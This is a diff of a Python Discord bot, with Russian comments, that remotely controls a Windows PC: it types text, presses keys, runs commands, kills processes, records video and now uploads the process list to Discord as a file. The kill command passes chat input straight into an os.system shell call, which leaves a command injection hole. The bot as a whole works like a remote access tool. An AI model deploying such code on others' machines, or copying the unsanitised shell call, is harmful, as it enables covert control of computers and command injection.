@@ -14,7 +14,7 @@ import numpy as np
 import cv2
 import config
 import datetime
-
+import time
 
 pg.FAILSAFE = False
 bot = commands.Bot(command_prefix='!') # префикс для комманд
@@ -63,17 +63,6 @@ async def write(ctx,*,text): # написать текс
     pg.typewrite(text)
     await ctx.send(f"CAT: Был набран текст: {text}")
 
-
-@bot.command()
-async def playsound(ctx,sound): # проиграть звук
-    if int(sound) == 1:
-        playsound('sounds/Sound1.mp3')
-        await ctx.send('CAT: Звук проигран!')
-    elif int(sound) == 2: 
-        playsound('sounds/Sound2.mp3')
-        await ctx.send('CAT: Звук проигран!')
-
-
 @bot.command()
 async def send(ctx,key,how_many): #нажать клавишу
     a = 0
@@ -92,7 +81,6 @@ async def command(ctx,*,command):
     else:
         await ctx.send('CAT: Ошибка выполения!')
 
-
 @bot.command()
 async def kill(ctx,*,process):
     output = os.system(f'taskkill /im {str(process)} /f')
@@ -102,9 +90,12 @@ async def kill(ctx,*,process):
         await ctx.send('CAT: Такого процесса нет!')
 @bot.command()
 async def processlist(ctx):
-    await ctx.send(subprocess.check_output(['tasklist']))
-
-
+    data = subprocess.check_output(['tasklist'],universal_newlines=False)
+    f = open('processlist.txt', 'w')
+    f.write(str(data))
+    f.close()
+    await ctx.send('Открытые процессы:',file=discord.File('processlist.txt'))
+    os.remove('processlist.txt')
 @bot.command()
 async def video(ctx,how_many): #запись видео
     output = 'video.avi'
